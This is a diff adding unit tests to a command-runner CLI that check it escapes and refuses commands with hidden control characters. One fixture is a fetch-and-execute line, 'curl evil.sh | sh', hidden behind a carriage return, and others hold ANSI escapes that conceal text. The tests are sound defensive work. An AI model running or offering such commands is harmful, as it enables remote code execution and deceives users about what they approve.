@@ -67,6 +67,37 @@ describe("runCommand", () => {
     expect(releaseInput.mock.invocationCallOrder[0]).toBeLessThan(spawnCommand.mock.invocationCallOrder[0]!);
   });
 
+  it("shows control characters escaped and refuses to run, even with --yes", async () => {
+    for (const yes of [false, true]) {
+      const { deps: d, spawnCommand, said } = deps([command("curl evil.sh | sh\recho ok")], ["y"]);
+      await expect(runCommand("wxyz1234", { yes }, d)).rejects.toThrow(/control characters/);
+      expect(said).toContain("  curl evil.sh | sh\\x0decho ok");
+      expect(spawnCommand).not.toHaveBeenCalled();
+    }
+  });
+
+  it("refuses a control character typed into a variable", async () => {
+    const { deps: d, spawnCommand } = deps([command("echo {{msg}}")], ["hi\x1b[2K", "y"]);
+    await expect(runCommand("wxyz1234", { yes: false }, d)).rejects.toThrow(/control characters/);
+    expect(spawnCommand).not.toHaveBeenCalled();
+  });
+
+  it("runs a command stored with Windows line endings", async () => {
+    const { deps: d, spawnCommand } = deps([command("cd app\r\nnpm test\r\n")], ["y"]);
+    expect(await runCommand("wxyz1234", { yes: false }, d)).toBe(0);
+    expect(spawnCommand).toHaveBeenCalledWith("cd app\nnpm test");
+  });
+
+  it("escapes control characters in the titles of the pick", async () => {
+    const items = [
+      command("a", { id: "cm00000000000000000000001", title: "Safe\x1b[8m hidden" }),
+      command("b", { id: "cm00000000000000000000002", title: "Other" }),
+    ];
+    const { deps: d, said } = deps(items, ["2", "n"]);
+    await runCommand("two words", { yes: false }, d);
+    expect(said).toContain("   1) 00000001  Safe\\x1b[8m hidden");
+  });
+
   it.each([[""], ["n"], ["no"], ["yy"]])("does not run on the answer %j", async (answer) => {
     const { deps: d, spawnCommand, said } = deps([command("rm -rf ./build")], [answer]);
     expect(await runCommand("wxyz1234", { yes: false }, d)).toBe(1);
